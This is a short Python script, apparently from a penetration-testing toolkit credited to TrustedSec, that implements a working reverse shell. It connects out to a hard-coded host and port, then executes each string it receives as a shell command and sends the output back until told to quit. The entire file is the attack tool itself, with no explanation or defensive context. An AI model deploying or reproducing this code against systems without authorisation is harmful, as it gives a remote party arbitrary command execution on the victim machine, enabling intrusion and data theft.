#!/usr/bin/python

# Authored by: Dave Kennedy (ReL1K)
# Copyright 2012 TrustedSec, LLC. All rights reserved. 
#
# This piece of software code is licensed under the FreeBSD license..
# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information. 
# 
# Polished by: Oleg Mitrofanov (reider-roque)


import socket as so, subprocess as su
HOST = '192.168.40.47'
PORT = 4646

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!\n')
while 1:
    data = s.recv(1024).strip()
    if data == 'quit': break
    proc = su.Popen(data, shell=True, stdout=su.PIPE,
        stderr=su.PIPE, stdin=su.PIPE)
    result = proc.stdout.read() 
    serr = proc.stderr.read().strip()
    if serr.strip() != '': result += '\nSTDERR:\n%s\n' % serr
    s.send(result)
s.close()
